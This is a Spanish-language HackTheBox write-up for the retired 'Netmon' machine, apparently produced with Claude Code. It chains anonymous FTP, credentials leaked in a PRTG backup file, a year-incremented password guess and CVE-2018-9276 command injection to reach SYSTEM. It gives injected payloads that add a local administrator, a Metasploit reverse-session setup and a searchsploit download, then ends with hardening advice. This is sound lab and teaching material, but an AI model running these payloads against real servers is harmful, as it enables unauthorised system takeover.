---
title: Netmon (HackTheBox Easy)
date: 2026-06-15
tags: [ciberseguridad, htb, pentesting, ciberseguridad/windows, ciberseguridad/ftp, ciberseguridad/rce, ciberseguridad/credentials, ciberseguridad/privesc]
type: nota
status: en-progreso
source: claude-code
aliases: [htb-netmon, netmon-htb, prtg-rce]
---

# Netmon — HackTheBox (Easy)

SO: Windows · Dificultad: Easy · Skills: FTP anonimo, enumeracion de ficheros de configuracion, credential harvesting, CVE-2018-9276 (PRTG RCE como SYSTEM)

Netmon ilustra una cadena muy real en entornos corporativos: FTP con acceso anonimo al filesystem expone credenciales de backup de una herramienta de monitorizacion de red (PRTG); esas credenciales dan acceso al panel web; y el panel tiene un RCE conocido que da SYSTEM directamente. No hay lateral movement — es foothold-to-root en tres pasos limpios.

> HTB es un laboratorio de ciberseguridad legal y autorizado. Toda practica aqui descrita se realiza exclusivamente en sus entornos controlados.

---

## Objetivo

Obtener `user.txt` (home del usuario en Windows) y `root.txt` (escritorio del Administrador) encadenando: acceso anonimo FTP → lectura de config de PRTG con credencial de backup → acceso al panel web de PRTG → RCE como SYSTEM via CVE-2018-9276.

---

## Acceso a la maquina (paso previo)

1. Descarga tu perfil VPN desde HTB (`.ovpn`) y conectate:

```bash
sudo openvpn lab_<tuusuario>.ovpn
# Deja esta terminal abierta — la conexion debe mantenerse activa
```

2. En la web de HTB, ve a la maquina Netmon (seccion Machines → Retired) y haz clic en **Spawn Machine**. Obtienes una IP dinamica del tipo `10.10.10.x`.

3. Verifica conectividad:

```bash
ping -c2 <IP>
```

4. Sustituye `<IP>` por la IP real que te haya asignado HTB en todos los comandos siguientes.

> Las maquinas retiradas requieren suscripcion VIP. Las activas son gratuitas. El **Pwnbox** (Kali en el navegador dentro de HTB) ya viene conectado a la VPN.

---

## Reconocimiento

Categoria: escaneo de puertos + deteccion de servicios.

```bash
nmap -sC -sV -oN netmon.nmap <IP>
```

Puertos clave en la respuesta tipica:

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 21/tcp | FTP | vsftpd — **acceso anonimo habilitado** |
| 80/tcp | HTTP | Indy httpd — panel PRTG Network Monitor |
| 135, 139, 445 | SMB/RPC | Windows estandar |

El hallazgo critico es el FTP anonimo. Nmap con `-sC` ya avisa de ello con el script `ftp-anon`.

---

## Enumeracion

### FTP anonimo con acceso al filesystem de Windows

Categoria: exposicion de ficheros de configuracion por servicio mal configurado.

El FTP da acceso al volumen `C:\` completo. Esto es inusual y severo: significa que podemos leer cualquier fichero al que el proceso FTP tenga acceso.

```bash
ftp <IP>
# Usuario: anonymous
# Contrasena: (enter / cualquier cosa)
```

Navegar al directorio de configuracion de PRTG:

```bash
cd "ProgramData/Paessler/PRTG Network Monitor"
ls
```

Ficheros de interes:

```
PRTG Configuration.dat
PRTG Configuration.old
PRTG Configuration.old.bak   <-- este contiene credenciales en texto claro
```

Descargar el backup:

```bash
get "PRTG Configuration.old.bak"
```

### Extraccion de credencial del fichero de backup

Categoria: credential harvesting — secretos en ficheros de configuracion.

El fichero es XML. Busca la cadena `prtgadmin` o `password`:

```bash
grep -i "password\|dbpassword\|prtgadmin" "PRTG Configuration.old.bak"
```

Encontraras algo del estilo:

```xml
<dbpassword>
  PrTg@dmin2018
</dbpassword>
```

El nombre de usuario es `prtgadmin` (admin por defecto de PRTG).

**Truco critico — contrasena caducada:** el fichero es un backup antiguo (`.old.bak`). La contrasena real del sistema probablemente tiene el ano incrementado. Si `PrTg@dmin2018` no funciona, prueba `PrTg@dmin2019`. Este patron (backup desactualizado + usuario que rota el ano en la contrasena) es extremadamente comun en entornos reales y es exactamente lo que ocurre en esta maquina.

---

## Acceso inicial (foothold)

Categoria: acceso a panel de administracion con credenciales recuperadas.

Abre el panel PRTG en el navegador:

```
http://<IP>/
```

Introduce las credenciales:

- Usuario: `prtgadmin`
- Contrasena: `PrTg@dmin2019` (ajusta el ano si es necesario)

Si el login tiene exito, ves el dashboard de PRTG Network Monitor con acceso total de administrador. Esto es el foothold — control del panel de una herramienta que corre con privilegios de SYSTEM en Windows.

---

## Escalada de privilegios

Categoria: RCE autenticado en PRTG < 18.x — CVE-2018-9276.

### Que es CVE-2018-9276

PRTG Network Monitor versiones anteriores a 18.2.39 permite a un administrador autenticado inyectar comandos del sistema operativo a traves del parametro de **notificaciones por email**. El campo "Parameter" de las notificaciones de tipo "Execute Program" no sanitiza la entrada y el proceso de PRTG corre como `SYSTEM` en Windows.

Esto significa: admin del panel → ejecucion de comandos como SYSTEM → control total del sistema sin necesidad de otro paso de escalada.

### Exploit manual (sin Metasploit)

El exploit abusa de la creacion de una notificacion personalizada. El flujo es:

1. En PRTG, ve a **Setup → Account Settings → Notifications → Add New Notification**.
2. Nombre: cualquiera (p.ej. `pwn`).
3. En la seccion **Execute Program**, selecciona `Demo exe notification - outfile.ps1` como programa.
4. En el campo **Parameter**, inyecta el comando. Por ejemplo, para crear un usuario administrador:

```
test.txt; net user pentest Password123! /add; net localgroup administrators pentest /add
```

5. Guarda la notificacion y luego ejecutala manualmente con el boton **Send Test Notification** (o triggereala).

PRTG ejecuta el payload como SYSTEM. Puedes verificarlo creando un fichero en `C:\`:

```
test.txt; whoami > C:\pwned.txt
```

Luego lee el fichero via FTP para confirmar que el output es `nt authority\system`.

### Via Metasploit (estandar conocida)

Existe un modulo de Metasploit para CVE-2018-9276:

```bash
msfconsole
use exploit/windows/http/prtg_authenticated_rce
set RHOSTS <IP>
set ADMIN_USERNAME prtgadmin
set ADMIN_PASSWORD PrTg@dmin2019
set LHOST <TU_IP_VPN>
run
```

El modulo autentica en el panel, crea la notificacion maliciosa, la ejecuta, y entrega una sesion Meterpreter como `NT AUTHORITY\SYSTEM`. Internamente hace exactamente lo mismo que el proceso manual.

> Si el ano de la contrasena no es 2019, ajustalo en `ADMIN_PASSWORD` antes de lanzar.

### Alternativa: searchsploit

```bash
searchsploit PRTG
# Resultado relevante: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution
searchsploit -m windows/webapps/46527.sh
```

El script bash del ExploitDB automatiza la creacion de la notificacion via la API REST de PRTG con `curl`.

---

## Flags

Una vez tienes ejecucion como SYSTEM, las flags estan en:

| Flag | Ruta |
|------|------|
| `user.txt` | `C:\Users\Public\user.txt` (o el home del usuario no-admin encontrado) |
| `root.txt` | `C:\Users\Administrator\Desktop\root.txt` |

Con una shell de Meterpreter:

```bash
shell
type C:\Users\Public\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

O directamente via FTP anonimo para `user.txt` (el FTP tiene acceso al filesystem):

```bash
# En el cliente FTP
get "Users/Public/user.txt"
```

Ambas flags tienen el formato `<flag>` (32 caracteres hexadecimales).

---

## Patron y teoria

Esta seccion es la mas importante: el writeup es el ejemplo concreto, esto es el modelo mental transferible.

### El patron: config-leak → panel-access → RCE-as-SYSTEM

```
[Recon]          FTP anonimo expone filesystem completo
     |
     v
[Enum]           Fichero de backup con credencial en texto claro
                 (patron: backup = snapshot del pasado = credencial "caducada")
     |
     v
[Foothold]       Credencial ajustada (ano +1) da acceso a panel de admin
                 (patron: usuarios rotan el ano, no la contrasena base)
     |
     v
[Privesc/Root]   Panel corre como SYSTEM → RCE trivial via feature legitima
                 (patron: software de monitorizacion = privilegios altos por diseno)
```

Este patron (credential en config → panel → RCE privilegiado) aparece en decenas de CVEs reales: Nagios, SolarWinds, ManageEngine, Zabbix. No es un bug exotico — es el estado de muchos entornos corporativos.

### Por que el backup es el vector mas peligroso

Los backups de configuracion son habitualmente el punto mas debil de un sistema bien parcheado. El sistema de produccion puede estar actualizado; el backup `.old.bak` conserva la configuracion (y las credenciales) del momento en que se creo. Si el backup es accesible, toda la historia de credenciales es accesible.

**Patron de rotacion de contrasenas por ano:** muchos administradores cambian solo el ano al final de la contrasena (`Admin2018` → `Admin2019`). Si capturas un backup antiguo, puedes predecir la contrasena actual con un ataque de mutacion simple. Esto derrota completamente la politica de rotacion.

### Defensa — como disenar/configurar para evitarlo

**Como desarrollador o administrador:**

1. **FTP anonimo nunca en produccion.** Si necesitas FTP (mejor usa SFTP), restringe siempre a usuarios autenticados y limita el chroot al directorio minimo necesario. El FTP que da acceso al volumen raiz de Windows es un error de configuracion critico.

2. **Ficheros de configuracion con credenciales:** usa un gestor de secretos (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault). Si el software no soporta integracion con gestor de secretos, cifra el fichero de configuracion y gestiona la clave por separado.

3. **Backups de configuracion:** aplica el mismo nivel de proteccion al backup que al sistema original. Un backup accesible anonimamente con credenciales es peor que no tener backup.

4. **Rotacion de credenciales:** las politicas de "cambia el ano" son teatro de seguridad. Usa contrasenas aleatorias generadas por un gestor (Bitwarden, 1Password, etc.) — no variantes predecibles.

5. **Software de monitorizacion:** herramientas como PRTG, Nagios o Zabbix corren habitualmente con privilegios altos porque necesitan acceder a recursos del sistema. Esto los convierte en objetivo prioritario. Mantenerlos parcheados y sin exposicion a redes no confiables es critico.

6. **Principio de minimo privilegio en servicios:** si PRTG solo necesita leer metricas de red, no deberia correr como SYSTEM. Usa cuentas de servicio con permisos acotados.

7. **Superficie de ataque de paneles de administracion:** nunca expongas paneles de administracion de herramientas internas (PRTG, Jenkins, Grafana, Kibana) directamente a internet. Pon un proxy inverso con autenticacion adicional, o accede solo via VPN interna.

### CVE-2018-9276 — mecanismo tecnico

La vulnerabilidad esta en el motor de ejecucion de notificaciones de PRTG. El campo "Parameter" de las notificaciones de tipo script se pasa directamente a `cmd.exe` sin sanitizacion. Dado que el proceso padre de PRTG corre como `NT AUTHORITY\SYSTEM` (necesita acceso a WMI, SNMP, etc.), cualquier comando inyectado hereda ese contexto. Severidad CVSS3: **8.8 (High)** — requiere autenticacion de admin, pero el impacto es control total del sistema.

---

## Conexiones

- [[HTB_Easy/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[HTB_Starting_Point/00_README]]
- [[05-identidad-auth-y-secretos]] — credential harvesting, rotacion de contrasenas, gestion de secretos
- [[08-vulnerabilidades-y-explotacion]] — CVE-2018-9276, RCE, clasificacion de vulnerabilidades
- [[06-seguridad-de-sistemas-y-hardening]] — principio de minimo privilegio, configuracion de servicios Windows
- [[03-seguridad-de-redes]] — FTP vs SFTP, exposicion de servicios
